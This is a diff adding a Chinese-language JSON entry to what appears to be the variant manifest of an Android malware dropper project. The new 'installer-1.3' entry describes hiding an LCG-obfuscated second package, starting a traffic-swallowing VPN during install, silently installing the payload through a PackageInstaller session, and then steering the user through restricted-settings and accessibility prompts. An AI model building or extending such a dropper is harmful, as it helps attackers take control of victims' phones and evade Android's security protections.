@@ -209,6 +209,16 @@
         }
     },
     {
+        "id": "installer-1.3",
+        "name": "v1.3 · A 包安装器 / VPN 隔离安装",
+        "versionName": "1.3.0",
+        "versionCode": 4,
+        "sourceDir": "a-packages/installer-1.3",
+        "kind": "installer",
+        "payloadFormat": "lcg16",
+        "description": "A 包桌面安装器；B 包以 LCG 混淆内嵌，点击安装时请求 VPN 授权并启动吞流量 VPN，同时经 PackageInstaller 会话安装 B 包；安装成功返回 A 包，停 VPN 后走受限设置/无障碍引导进入内置网页。"
+    },
+    {
         "id": "installer-1.2",
         "name": "v1.2 · A 包安装器 / 受限设置引导",
         "versionName": "1.2.0",
